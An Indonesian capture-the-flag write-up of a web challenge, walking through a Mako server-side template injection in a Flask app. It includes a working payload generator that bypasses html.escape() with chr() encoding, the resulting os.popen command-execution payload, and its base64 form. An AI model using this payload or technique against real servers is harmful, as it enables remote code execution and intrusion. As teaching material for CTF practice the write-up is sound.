# Tsunade Gambling Master
**Category:** web <br>
**Point:** 300

> http://202.148.2.243:21201
> 
> [Main.py](./Main.py)

---

Diberikan sebuah alamat URL yang merujuk ke sebuah halaman fanpage K-pop yaitu `index.html`. Source-code dari halaman ini menunjukkan ada 2 button yang masing-masing menuju ke link `/example` dan `/intro-gan`

Lihat file [ini](./index.html) untuk isi dari source code halaman `index.html`.

Jika dilihat pada source code `Main.py` bisa didapat kalau server memakai Flask sebagai webserver dan Mako buat templating. 

Lihat file [ini](./Main.py) untuk isi dari source code `Main.py`.

Fungsi yang perlu diperhatikan adalah `base()` pada route `/intro-gan` karena fungsi pada route lain tidak menggunakan data POST dari form halaman `index.html`. 

Di fungsi tersebut dapat dilihat kalau data dari HTTP POST diambil lalu di-decode dari base64 dengan format encoding utf-32, lalu difilter dengan `html.escape()` untuk escaping karakter HTML, lalu hasilnya digabungkan ke sebuah string yang dimasukkan ke template Mako dan di-render ke HTML.

Mekanisme templating ini mempunyai kemungkinan berpotensi terhadap teknik SSTI atau Server-Side Template Injection. Mako mempunyai fitur yaitu eksekusi kode python di dalam blok `${}` . 

Langkah selanjutnya adalah mengetes hipotesis tadi, caranya adalah membuat kode python yang dibungkus oleh sintaks Mako tadi, jangan lupa kalau tiap karakter yang terkait dengan HTML akan di-escape oleh `html.escape()` jadi karakter seperti spasi, double-quote dll harus dihindari, lalu setelah dibungkus dengan sintaks Mako di-encode dalam base64 dengan encoding utf-32. Percobaan yang akan dilakukan adalah kode python `len([])` yang seharusnya memberi keluaran `0`.

[](./base64-online.png)

[](./insomnia-post-1.png)

Dapat dilihat kalau hasilnya sesuai yang diinginkan, yaitu panjang dari array kosong adalah `0`. Langkah selanjutnya adalah melihat apakah file flag ada lalu melihat isinya. Untuk masalah escaping dengan `html.escape()` bisa diatasi dengan mengubah karakter yang akan di-escape dari kode Unicode-nya dengan fungsi `chr()` . Kode yang akan dieksekusi adalah 

```
__import__(“os”).popen(“cat flag.txt”).read()
```

Ada banyak bagian kode diatas yang perlu diubah menjadi kumpulan fungsi `chr()` jadi script untuk generate kumpulan fungsi tadi dibuat.

```
def generate_Mako(str_param):  
    plain_str = str_param  
    pre_cmd = "${__import__(chr(111)+chr(115)).popen("  
  post_cmd = ")}"  
  pycode = ""  
  
  for code in plain_str:  
        pycode += "chr(" + str(ord(code)) + ")+"  
  pycode = pycode[:-1]  
  
    ret_pycode = pre_cmd + pycode + post_cmd  
  
    print(ret_pycode)  
  
generate_Mako("cat flag.txt")
```

Kode ini akan meng-import modul `os` lalu membaca file `flag.txt` dan mengambil nilai return-nya. Setelah diubah karakter nya menjadi kumpulan `chr()` dan dibungkus dengan sintaks Mako maka menjadi

```
${__import__(chr(111)+chr(115)).popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()}
```

[](./mako-ssti-script.png)

Lalu di-encode ke dalam base64 dengan charset utf-32 menjadi

```
//4AACQAAAB7AAAAXwAAAF8AAABpAAAAbQAAAHAAAABvAAAAcgAAAHQAAABfAAAAXwAAACgAAABjAAAAaAAAAHIAAAAoAAAAMQAAADEAAAAxAAAAKQAAACsAAABjAAAAaAAAAHIAAAAoAAAAMQAAADEAAAA1AAAAKQAAACkAAAAuAAAAcAAAAG8AAABwAAAAZQAAAG4AAAAoAAAAYwAAAGgAAAByAAAAKAAAADkAAAA5AAAAKQAAACsAAABjAAAAaAAAAHIAAAAoAAAAOQAAADcAAAApAAAAKwAAAGMAAABoAAAAcgAAACgAAAAxAAAAMQAAADYAAAApAAAAKwAAAGMAAABoAAAAcgAAACgAAAAzAAAAMgAAACkAAAArAAAAYwAAAGgAAAByAAAAKAAAADEAAAAwAAAAMgAAACkAAAArAAAAYwAAAGgAAAByAAAAKAAAADEAAAAwAAAAOAAAACkAAAArAAAAYwAAAGgAAAByAAAAKAAAADkAAAA3AAAAKQAAACsAAABjAAAAaAAAAHIAAAAoAAAAMQAAADAAAAAzAAAAKQAAACsAAABjAAAAaAAAAHIAAAAoAAAANAAAADYAAAApAAAAKwAAAGMAAABoAAAAcgAAACgAAAAxAAAAMQAAADYAAAApAAAAKwAAAGMAAABoAAAAcgAAACgAAAAxAAAAMgAAADAAAAApAAAAKwAAAGMAAABoAAAAcgAAACgAAAAxAAAAMQAAADYAAAApAAAAKQAAAC4AAAByAAAAZQAAAGEAAABkAAAAKAAAACkAAAB9AAAA
```

String diatas akan dimasukkan ke form HTTP POST di bagian key `name=`. Jika request dilakukan lagi maka hasilnya adalah

[](./insomnia-post-2.png)

Dapat dilihat kalau flag telah berhasil ditemukan yaitu `KKSI2019{64_32_16_8_4_2_0} `
